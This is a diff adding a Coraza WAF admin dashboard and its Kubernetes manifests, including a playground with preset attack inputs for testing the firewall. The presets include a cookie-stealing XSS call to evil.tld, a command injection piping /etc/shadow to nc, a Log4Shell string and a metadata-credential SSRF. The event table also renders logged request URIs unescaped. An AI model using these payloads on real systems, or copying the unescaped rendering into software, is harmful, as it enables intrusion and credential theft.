+            ioc_reputation: "AlienVault OTX Monitored | Tor Exit / SQLi Actor"
+          }
+        };
+
+        function renderBlockedTable() {
+          const tbody = document.getElementById('blockedTableBody');
+          const ips = currentCfg.blocked_ips || [];
+          const detailsList = currentCfg.blocked_ip_details || [];
+          const detailsMap = {};
+          detailsList.forEach(d => { if (d.ip) detailsMap[d.ip] = d; });
+
+          document.getElementById('statBlockedCount').textContent = ips.length;
+          document.getElementById('badgeBlockedCount').textContent = ips.length;
+          document.getElementById('visibleBlockedCount').textContent = ips.length;
+
+          if (!ips.length) {
+            tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; color:var(--muted); padding:24px;">No client IPs currently blocked in Coraza WAF.</td></tr>';
+            return;
+          }
+
+          tbody.innerHTML = ips.map(ip => {
+            const meta = detailsMap[ip] || KNOWN_BLOCKED_METADATA[ip] || {
+              threshold: "> 5 req / 15m (Automated Defense)",
+              reasoning: "Exceeded attack threshold of > 5 attacks within a 15-minute sliding window",
+              attack_vector: "Automated Exploit / Scanner Probing",
+              sample_payload: "HTTP 403 / ModSecurity Dropped",
+              top_paths: ["/"],
+              country: "External WAN",
+              city: "Unknown",
+              country_iso: "XX",
+              flag: "🌐",
+              ioc_reputation: "AlienVault OTX Monitored"
+            };
+
+            const flag = meta.flag || "🌐";
+            const countryStr = `${flag} ${meta.country || 'Unknown'}${meta.city && meta.city !== 'Unknown' ? ` (${meta.city})` : ''}`;
+            const pathsHtml = (meta.top_paths || []).slice(0, 3).map(p => `<span class="tag-pill">${escapeHtml(p)}</span>`).join('');
+            const openSearchLink = `http://192.168.2.243:5601/app/discover#/?_a=(index:logs-waf-all,query:(language:kuery,query:'client_ip:%22${encodeURIComponent(ip)}%22'))`;
+
+            return `
+              <tr class="blocked-row" data-ip="${escapeHtml(ip)}" data-country="${escapeHtml(meta.country || '')}" data-vector="${escapeHtml(meta.attack_vector || '')}" data-payload="${escapeHtml(meta.sample_payload || '')}">
+                <td style="white-space:nowrap;">
+                  <strong style="color:#f87171; font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:13px;">${escapeHtml(ip)}</strong>
+                  <button onclick="copyToClipboard('${escapeHtml(ip)}')" title="Copy IP" style="background:transparent; border:none; color:var(--muted); cursor:pointer; font-size:12px; margin-left:4px;">📋</button>
+                </td>
+                <td>
+                  <span style="display:inline-block; padding:2px 8px; border-radius:4px; font-size:11.5px; font-weight:700; background:rgba(239,68,68,0.15); color:#fca5a5; border:1px solid #ef4444;">
+                    ${escapeHtml(meta.threshold || '> 5 req / 15m')}
+                  </span>
+                </td>
+                <td>
+                  <div style="font-weight:600; color:#f1f5f9; font-size:12.5px;">${escapeHtml(meta.attack_vector || 'Exploit Probing')}</div>
+                  <div style="font-size:11px; color:var(--muted); max-width:240px; margin-top:2px;">${escapeHtml(meta.reasoning || '')}</div>
+                </td>
+                <td>
+                  <span class="code-box" title="${escapeHtml(meta.sample_payload || '')}">${escapeHtml(meta.sample_payload || '-')}</span>
+                </td>
+                <td style="max-width:180px;">${pathsHtml || '<span style="color:var(--muted); font-size:11px;">-</span>'}</td>
+                <td style="white-space:nowrap; font-size:12px;">${countryStr}</td>
+                <td>
+                  <span style="display:inline-block; padding:2px 7px; border-radius:4px; font-size:11px; font-weight:600; background:#064e3b; color:#6ee7b7; border:1px solid #10b981;">
+                    ${escapeHtml(meta.ioc_reputation || 'AlienVault OTX Monitored')}
+                  </span>
+                </td>
+                <td>
+                  <span class="pill pill-blocked" style="font-size:10.5px;">403 FORBIDDEN</span>
+                </td>
+                <td style="white-space:nowrap;">
+                  <div style="display:flex; gap:6px;">
+                    <button class="btn btn-danger btn-sm" onclick="unblockIP('${escapeHtml(ip)}')">⚡ Unblock</button>
+                    <a class="btn btn-outline btn-sm" href="${openSearchLink}" target="_blank">🔍 Logs</a>
+                  </div>
+                </td>
+              </tr>
+            `;
+          }).join('');
+        }
+
+        function filterBlockedTable() {
+          const query = (document.getElementById('blockedSearch').value || '').toLowerCase();
+          let count = 0;
+          document.querySelectorAll('.blocked-row').forEach(row => {
+            const text = (row.innerText || '').toLowerCase();
+            if (!query || text.includes(query)) {
+              row.style.display = '';
+              count++;
+            } else {
+              row.style.display = 'none';
+            }
+          });
+          document.getElementById('visibleBlockedCount').textContent = count;
+        }
+
+        function copyToClipboard(text) {
+          navigator.clipboard.writeText(text);
+          showBanner(`Copied ${text} to clipboard!`, false);
+        }
+
+        async function unblockIP(ip) {
+          if (!confirm(`Are you sure you want to unblock client IP ${ip}? This will immediately hot-reload Coraza WAF without downtime.`)) {
+            return;
+          }
+          if (!currentCfg) return;
+          currentCfg.blocked_ips = (currentCfg.blocked_ips || []).filter(item => item !== ip);
+          if (currentCfg.blocked_ip_details) {
+            currentCfg.blocked_ip_details = currentCfg.blocked_ip_details.filter(item => item.ip !== ip);
+          }
+          const res = await fetch('/api/config', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(currentCfg)
+          });
+          const data = await res.json();
+          if (!res.ok) {
+            showBanner('❌ ' + (data.error || 'Failed to unblock IP'), true);
+            return;
+          }
+          showBanner(`✅ Successfully unblocked ${ip} and hot-reloaded Coraza WAF!`, false);
+          await fetchStatus();
+        }
+
+        function renderRuleGroups(groups) {
+          const container = document.getElementById('ruleGroupsContainer');
+          container.innerHTML = '';
+          groups.forEach((rg, idx) => {
+            const div = document.createElement('div');
+            div.className = 'rg-item';
+            div.innerHTML = `
+              <div class="rg-head">
+                <div>
+                  <div class="rg-title">${rg.name}</div>
+                  <span class="rg-badge">${rg.owasp_top10}</span>
+                  <span class="rg-badge" style="background:#064e3b; color:#6ee7b7;">${rg.category}</span>
+                </div>
+                <label class="switch">
+                  <input type="checkbox" data-idx="${idx}" class="rg-toggle" ${rg.enabled ? 'checked' : ''} />
+                  <span>${rg.enabled ? 'Enabled' : 'Disabled'}</span>
+                </label>
+              </div>
+              <div class="rg-desc">${rg.description}</div>
+              <details>
+                <summary style="font-size:12px; color:#60a5fa; cursor:pointer; margin-bottom:6px;">View / Edit Native Coraza SecRules (${rg.id})</summary>
+                <textarea rows="4" data-idx="${idx}" class="rg-directives">${rg.directives}</textarea>
+              </details>
+            `;
+            container.appendChild(div);
+          });
+        }
+
+        function renderEvents(events) {
+          const tbody = document.getElementById('eventsTableBody');
+          if (!events.length) {
+            tbody.innerHTML = '<tr><td colspan="8" style="color:var(--muted); text-align:center; padding:20px;">No blocked or detected attack events yet. Use Tab 3 (Playground) to simulate an OWASP attack!</td></tr>';
+            return;
+          }
+          tbody.innerHTML = events.map(ev => `
+            <tr>
+              <td style="white-space:nowrap; font-size:12px;">${ev['@timestamp']}</td>
+              <td><span class="pill pill-${ev.action}">${ev.action} (${ev.status})</span></td>
+              <td><strong>${ev.severity}</strong></td>
+              <td><code>${ev.rule_id || '-'}</code></td>
+              <td>${ev.owasp_category}</td>
+              <td><code>${ev.client_ip}</code></td>
+              <td><code>${ev.request_method} ${ev.request_uri}</code></td>
+              <td style="font-size:12px; color:#cbd5e1;">${ev.rule_msg || '-'}</td>
+            </tr>
+          `).join('');
+        }
+
+        async function saveAndReload() {
+          if (!currentCfg) return;
+          currentCfg.engine_mode = document.getElementById('engineMode').value;
+          currentCfg.paranoia_level = parseInt(document.getElementById('paranoiaLevel').value, 10) || 1;
+          currentCfg.enable_full_crs = document.getElementById('enableFullCRS').checked;
+          currentCfg.blocked_ips = document.getElementById('blockedIPs').value.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
+          currentCfg.allowed_ips = document.getElementById('allowedIPs').value.split(/[\n,]+/).map(s => s.trim()).filter(Boolean);
+          currentCfg.custom_sec_rules = document.getElementById('customSecRules').value;
+
+          document.querySelectorAll('.rg-toggle').forEach(el => {
+            const idx = parseInt(el.getAttribute('data-idx'), 10);
+            currentCfg.rule_groups[idx].enabled = el.checked;
+          });
+          document.querySelectorAll('.rg-directives').forEach(el => {
+            const idx = parseInt(el.getAttribute('data-idx'), 10);
+            currentCfg.rule_groups[idx].directives = el.value;
+          });
+
+          const res = await fetch('/api/config', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(currentCfg)
+          });
+          const data = await res.json();
+          if (!res.ok) {
+            showBanner('❌ ' + (data.error || 'Failed to compile SecRules'), true);
+            return;
+          }
+          showBanner('✅ ' + data.message, false);
+          await fetchStatus();
+        }
+
+        function insertSnippet(type) {
+          const box = document.getElementById('customSecRules');
+          const id = Math.floor(100100 + Math.random() * 899);
+          let rule = '';
+          if (type === 'uri') {
+            rule = `\nSecRule REQUEST_URI "@beginsWith /secret-admin" "id:${id},phase:1,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Admin URI',severity:'ERROR'"`;
+          } else if (type === 'ua') {
+            rule = `\nSecRule REQUEST_HEADERS:User-Agent "@contains BadScraper" "id:${id},phase:1,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Scraper Bot',severity:'ERROR'"`;
+          } else if (type === 'arg') {
+            rule = `\nSecRule ARGS "@containsdrop_table" "id:${id},phase:2,deny,status:403,log,msg:'Custom SecRule ${id}: Blocked Suspicious Argument',severity:'CRITICAL'"`;
+          } else if (type === 'allow') {
+            rule = `\nSecRule REQUEST_URI "@streq /api/healthz" "id:${id},phase:1,allow,nolog,msg:'Whitelist healthcheck'"`;
+          }
+          box.value += rule + '\n';
+        }
+
+        function loadPreset(name) {
+          const m = document.getElementById('simMethod');
+          const u = document.getElementById('simURI');
+          const ip = document.getElementById('simIP');
+          const ua = document.getElementById('simUA');
+          const b = document.getElementById('simBody');
+          b.value = '';
+          ua.value = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
+          m.value = 'GET';
+
+          if (name === 'sqli') {
+            u.value = "/api/users?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--";
+            ip.value = '185.220.101.45';
+          } else if (name === 'xss') {
+            u.value = '/search?q=<script>fetch("https://evil.tld/?c="+document.cookie)<\/script>';
+            ip.value = '91.240.118.172';
+          } else if (name === 'lfi') {
+            u.value = '/download?file=../../../../etc/passwd';
+            ip.value = '45.155.205.233';
+          } else if (name === 'rce') {
+            m.value = 'POST';
+            u.value = '/api/ping';
+            b.value = 'host=127.0.0.1; cat /etc/shadow | nc 198.51.100.1 4444';
+            ip.value = '103.253.41.98';
+          } else if (name === 'log4shell') {
+            u.value = '/api/login';
+            ua.value = '${jndi:ldap://198.51.100.99:1389/ExploitPayload}';
+            ip.value = '194.26.29.114';
+          } else if (name === 'ssrf') {
+            u.value = '/api/webhook?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+            ip.value = '89.248.165.51';
+          } else if (name === 'scanner') {
+            u.value = '/index.html';
+            ua.value = 'sqlmap/1.8.2#stable (https://sqlmap.org)';
+            ip.value = '162.142.125.10';
+          } else if (name === 'clean') {
+            u.value = '/';
+            ip.value = '8.8.8.8';
+          }
+        }
+
+        async function runSimulation() {
+          const payload = {
+            method: document.getElementById('simMethod').value,
+            uri: document.getElementById('simURI').value,
+            client_ip: document.getElementById('simIP').value,
+            user_agent: document.getElementById('simUA').value,
+            body: document.getElementById('simBody').value,
+            log_to_audit: document.getElementById('simLogToAudit').checked
+          };
+          const res = await fetch('/api/simulate', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+          });
+          const data = await res.json();
+          const box = document.getElementById('simResultBox');
+          box.style.display = 'block';
+          const isBlocked = data.interrupted;
+          box.style.borderColor = isBlocked ? '#ef4444' : '#10b981';
+          box.innerHTML = `
+            <h3 style="margin:0 0 8px 0; color:${isBlocked ? '#f87171' : '#34d399'};">
+              ${isBlocked ? '🛑 BLOCKED BY CORAZA WAF (HTTP 403 Forbidden)' : '✅ ALLOWED BY CORAZA WAF (HTTP 200 OK)'}
+            </h3>
+            <div style="font-size:13px; margin-bottom:8px;">
+              <strong>Transaction ID:</strong> <code>${data.transaction_id}</code> &bull;
+              <strong>Primary Rule ID:</strong> <code>${data.primary_rule || 'None'}</code> &bull;
+              <strong>OWASP Category:</strong> ${data.owasp_category} (${data.owasp_top10}) &bull;
+              <strong>Severity:</strong> ${data.severity}
+            </div>
+            ${data.primary_msg ? `<div style="font-size:13px; color:#fca5a5;"><strong>Rule Message:</strong> ${data.primary_msg}</div>` : ''}
+          `;
+          await fetchStatus();
+        }
+
+        fetchStatus();
+        setInterval(fetchStatus, 10000);
+      </script>
+    </body>
+    </html>
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: coraza-waf
+  namespace: default
+  labels:
+    app: coraza-waf
+spec:
+  replicas: 1
+  strategy:
+    type: Recreate
+  selector:
+    matchLabels:
+      app: coraza-waf
+  template:
+    metadata:
+      labels:
+        app: coraza-waf
+    spec:
+      affinity:
+        nodeAffinity:
+          requiredDuringSchedulingIgnoredDuringExecution:
+            nodeSelectorTerms:
+              - matchExpressions:
+                  - key: kubernetes.io/hostname
+                    operator: In
+                    values:
+                      - kubeapi
+                      - kubeworker2
+      containers:
+        - name: coraza-waf
+          image: golang:1.22-alpine
+          imagePullPolicy: IfNotPresent
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              set -e
+              mkdir -p /var/log/waf /data/bin /data/build
+              touch /var/log/waf/audit.log
+              /bin/sh /fluent-bit/etc/rotate-logs.sh &
+
+              cp /src/main.go /src/ui.html /data/build/
+              cd /data/build
+              CUR_HASH=$$(sha256sum main.go ui.html | sha256sum | awk "{print \$$1}")
+              OLD_HASH=$$(cat /data/bin/coraza-waf.sha256 2>/dev/null || echo "")
+
+              if [ ! -x /data/bin/coraza-waf-server ] || [ "$$CUR_HASH" != "$$OLD_HASH" ]; then
+                echo "[Coraza WAF] Compiling native Go Coraza v3 + OWASP CRS v4 binary..."
+                export GOCACHE=/data/go-cache
+                export GOPATH=/data/go-path
+                if [ ! -f go.mod ]; then
+                  go mod init hypatian-coraza-waf
+                fi
+                go get github.com/corazawaf/coraza/v3@v3.2.1 github.com/corazawaf/coraza-coreruleset/v4@v4.3.0
+                go mod tidy
+                CGO_ENABLED=0 GOOS=linux go build -ldflags="-s -w" -o /data/bin/coraza-waf-server main.go
+                echo "$$CUR_HASH" > /data/bin/coraza-waf.sha256
+                echo "[Coraza WAF] Compilation complete."
+              else
+                echo "[Coraza WAF] Using cached native Coraza v3 binary (/data/bin/coraza-waf-server)."
+              fi
+
+              exec /data/bin/coraza-waf-server
+          env:
+            - name: UPSTREAM_URL
+              value: "http://hypatian-web-service.default.svc.cluster.local:80"
+            - name: WAF_DATA_DIR
+              value: "/data"
+            - name: WAF_AUDIT_LOG
+              value: "/var/log/waf/audit.log"
+          ports:
+            - containerPort: 80
+              name: http-waf
+            - containerPort: 8080
+              name: http-ui
+          readinessProbe:
+            httpGet:
+              path: /waf-healthz
+              port: 80
+            initialDelaySeconds: 5
+            periodSeconds: 10
+          resources:
+            requests:
+              cpu: 50m
+              memory: 128Mi
+            limits:
+              cpu: 1000m
+              memory: 768Mi
+          volumeMounts:
+            - name: waf-src
+              mountPath: /src
+            - name: waf-data
+              mountPath: /data
+            - name: waf-logs
+              mountPath: /var/log/waf
+            - name: sidecar-config
+              mountPath: /fluent-bit/etc
+        - name: fluent-bit-sidecar
+          image: fluent/fluent-bit:latest
+          imagePullPolicy: IfNotPresent
+          command: ["/fluent-bit/bin/fluent-bit", "-c", "/fluent-bit/etc/fluent-bit-waf.conf"]
+          resources:
+            requests:
+              cpu: 10m
+              memory: 24Mi
+            limits:
+              cpu: 100m
+              memory: 64Mi
+          volumeMounts:
+            - name: waf-logs
+              mountPath: /var/log/waf
+            - name: sidecar-config
+              mountPath: /fluent-bit/etc
+      volumes:
+        - name: waf-src
+          configMap:
+            name: coraza-waf-source
+        - name: waf-data
+          persistentVolumeClaim:
+            claimName: coraza-waf-data-pvc
+        - name: waf-logs
+          emptyDir:
+            sizeLimit: 64Mi
+        - name: sidecar-config
+          configMap:
+            name: fluent-bit-sidecar-config
+            defaultMode: 0755
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: coraza-waf-service
+  namespace: default
+  labels:
+    app: coraza-waf
+spec:
+  type: LoadBalancer
+  loadBalancerIP: 192.168.2.244
+  selector:
+    app: coraza-waf
+  ports:
+    - name: http-waf
+      protocol: TCP
+      port: 80
+      targetPort: 80
+    - name: http-ui
+      protocol: TCP
+      port: 8080
+      targetPort: 8080
